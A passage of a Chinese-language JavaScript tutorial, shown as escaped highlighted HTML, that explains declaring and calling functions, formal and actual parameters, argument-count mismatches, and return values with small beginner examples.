        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hi~~&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// (1) function 声明函数的关键字，全部小写
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// (2) 函数是做某件事情，函数名一般是动词 sayHi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// (3) 函数不调用自己不执行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 调用函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//函数名();
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sayHi&lt;/span&gt;();
    &lt;span style=&#34;color:#75715e&#34;&gt;// 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;924-案例&#34;&gt;9.2.4 案例&lt;/h3&gt;
&lt;h4 id=&#34;案例1利用函数计算1100之间的累加和&#34;&gt;案例1：利用函数计算1~100之间的累加和&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 利用函数计算 1~100 之间的累加和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 调用函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;();
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;93-函数的参数&#34;&gt;9.3 函数的参数&lt;/h2&gt;
&lt;h3 id=&#34;931-形参和实参&#34;&gt;9.3.1 形参和实参&lt;/h3&gt;
&lt;p&gt;在&lt;strong&gt;声明函数&lt;/strong&gt;时，可以在函数名称后面的小括号中添加一些参数，这些参数被称为&lt;strong&gt;形参&lt;/strong&gt;，而在&lt;strong&gt;调用该函数时&lt;/strong&gt;，同样也需要传递相应的参数，这些参数被称为&lt;strong&gt;实参&lt;/strong&gt;。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;形参&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;形式&lt;/strong&gt;上的参数，&lt;strong&gt;函数定义&lt;/strong&gt;的时候传递的参数，当前并不知道是什么&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;实参&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;实际&lt;/strong&gt;上的参数，&lt;strong&gt;函数调用&lt;/strong&gt;的时候传递的参数，实参是传递给形参的&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;参数的作用&lt;/strong&gt;：在&lt;strong&gt;函数内部&lt;/strong&gt;某些值不能固定，我们可以通过参数在&lt;strong&gt;调用函数时传递&lt;/strong&gt;不同的值进去&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 函数可以重复相同的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;酸辣土豆丝&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;();
    &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;();
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 我们可以利用函数的参数实现函数重复不同的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;函数名&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;形参1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;形参2&lt;/span&gt;...) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 在声明函数的小括号里面是形参（形式上的参数）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;函数名&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;实参1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;实参2&lt;/span&gt;...)	&lt;span style=&#34;color:#75715e&#34;&gt;// 在函数调用的小括号里面是实参（实际的参数）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 形参和实参的执行过程
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 形参是接收实参的 aru = &amp;#39;酸辣土豆丝&amp;#39; 形参类似于一个变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;酸辣土豆丝&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大肘子&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 函数的参数可以有，也可以没有，个数不限
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;932-案例&#34;&gt;9.3.2 案例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 利用函数求任意两个数的和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);

    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 利用函数求任意两个数之间的和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSums&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;end&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;end&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSums&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSums&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 注意点
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3.1 多个参数之间用逗号隔开
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3.2 形参可以看作是不用声明的变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;933-函数形参和实参个数不匹配问题&#34;&gt;9.3.3 函数形参和实参个数不匹配问题&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数个数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;实参个数 == 形参个数&lt;/td&gt;
&lt;td&gt;输出正确结果&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;实参个数 &amp;gt; 形参个数&lt;/td&gt;
&lt;td&gt;只取到形参的个数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;实参个数 &amp;lt; 形参个数&lt;/td&gt;
&lt;td&gt;多的形参定义为undefined，结果为NaN&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 函数形参实参个数匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 如果实参的个数和形参的个数一致，则正常输出结果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 如果实参的个数多余形参的个数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 如果实参的个数小于形参的个数：多余的形参定义为undefined，最终的结果就是NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 形参可以看作是不用声明的变量，num2 是一个变量但是没有接收值，结果就是undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 建议，我们尽量让实参的个数和形参相匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;934-小结&#34;&gt;9.3.4 小结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;函数可以带参数也可以不带参数&lt;/li&gt;
&lt;li&gt;声明函数的时候，函数名括号里面的是形参，形参的默认值为undefined&lt;/li&gt;
&lt;li&gt;调用函数的时候，函数名括号里面的是实参&lt;/li&gt;
&lt;li&gt;多个参数中间用逗号分隔&lt;/li&gt;
&lt;li&gt;形参的个数可以和实参个数不匹配，但是结果不可预计，我们尽量要匹配&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;94-函数的返回值&#34;&gt;9.4 函数的返回值&lt;/h2&gt;
&lt;h3 id=&#34;941-return-语句&#34;&gt;9.4.1 return 语句&lt;/h3&gt;
&lt;p&gt;有的时候，我们会希望函数将值返回给调用者，此时通过使用 return 语句就可以实现。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 函数是做某件事或者实现某种功能
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大肘子&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 函数的返回值格式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;函数名&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;需要返回的结果&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;函数名&lt;/span&gt;();
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2.1 我们函数只是实现某种功能，最终的结果需要返回给函数的调用者函数名(); 通过return实现的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2.2 只要函数遇到return，就把后面的结果返回给函数的调用者；函数名() = return 的结果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 代码验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getResult&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;666&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getResult&lt;/span&gt;();	&lt;span style=&#34;color:#75715e&#34;&gt;// getResult() = 666
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getResult&lt;/span&gt;());
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cook&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;大肘子&amp;#39;&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 求任意两个数的和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;942-案例&#34;&gt;9.4.2 案例&lt;/h3&gt;
&lt;h4 id=&#34;案例1利用函数求任意两个数的最大值&#34;&gt;案例1：利用函数求任意两个数的最大值&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 利用函数求两个数的最大值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;;
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#75715e&#34;&gt;// 或者是下面这个三元表达式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;));
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getMax&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;));
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例2利用函数求任意一个数组中的最大值&#34;&gt;案例2：利用函数求任意一个数组中的最大值&lt;/h4&gt;
